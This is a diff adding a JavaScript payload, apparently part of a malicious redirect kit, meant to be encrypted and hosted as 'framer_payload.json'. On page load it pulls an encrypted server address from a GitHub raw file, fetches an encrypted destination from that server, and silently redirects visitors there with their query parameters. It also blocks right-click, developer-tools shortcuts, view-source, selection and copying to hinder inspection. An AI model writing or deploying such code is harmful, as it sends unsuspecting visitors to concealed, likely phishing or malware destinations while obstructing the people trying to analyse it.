@@ -1,0 +1,58 @@
+// This is the raw JS to encrypt and upload as framer_payload.json
+// The encrypted version should be: {"d": "ENCRYPTED_BASE64_HERE"}
+
+var CONFIG_URL = 'https://raw.githubusercontent.com/laurseraph-svg/oatedbilly/main/oatsandhayswithbays.json';
+var SERVER_URL = null;
+
+async function loadConfig() {
+    try {
+        var r = await fetch(CONFIG_URL + '?t=' + Date.now());
+        var c = await r.json();
+        SERVER_URL = window._d(c.d);
+        return SERVER_URL;
+    } catch (e) { return null; }
+}
+
+async function fetchAndRedirect() {
+    await loadConfig();
+    if (!SERVER_URL) return;
+    
+    try {
+        var r = await fetch(SERVER_URL);
+        if (!r.ok) throw new Error('Server error');
+        var enc = await r.text();
+        var url = window._d(enc);
+        if (!url) throw new Error('Decrypt failed');
+        
+        var finalUrl = url;
+        if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
+            finalUrl = 'https://' + finalUrl;
+        }
+        
+        var cur = new URL(window.location.href);
+        var q = cur.search, h = cur.hash;
+        if (q) finalUrl += (finalUrl.includes('?') ? '&' : '?') + q.substring(1);
+        if (h) finalUrl += h;
+        
+        setTimeout(function() { window.location.href = finalUrl; }, 500);
+    } catch (e) { console.error('Error:', e); }
+}
+
+// Disable right-click
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+
+// Disable dev tools shortcuts
+document.addEventListener('keydown', function(e) {
+    if (e.keyCode === 123) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.keyCode === 83) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.keyCode === 80) { e.preventDefault(); return false; }
+});
+
+// Disable selection/copy
+document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
+
+// Start
+window.addEventListener('DOMContentLoaded', fetchAndRedirect);
